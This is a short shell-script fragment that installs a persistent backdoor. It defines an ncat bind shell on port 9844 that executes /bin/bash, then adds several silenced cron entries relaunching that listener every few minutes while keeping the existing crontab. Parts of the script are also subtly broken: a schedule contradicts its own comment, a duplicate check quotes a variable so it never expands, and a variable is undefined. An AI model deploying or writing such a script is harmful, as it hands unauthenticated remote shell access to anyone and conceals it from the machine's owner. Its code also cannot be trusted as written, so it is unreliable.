COMMAND="ncat -l 9844 -i 10 -v -e /bin/bash"

## INSTALL CRON
# create cronjob to activate the script in certain interals:
# repeats every 10 minutes, during those 10min the pattern is:
# at minute: 0, 2, 3, 6, 8

echo "10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
echo "2-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
echo "3-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
echo "6-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
echo "8-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron


# Check if cronjob already installed
if crontab -l | grep -q '$COMMAND' ; then
	echo "Crontab for $SCRIPT already installed, skipping"
else
	echo "Installing cronjobs"
	crontab -l >> tmpcron # make sure old cronjobs are kept
	crontab < tmpcron
fi

rm -rf tmpcron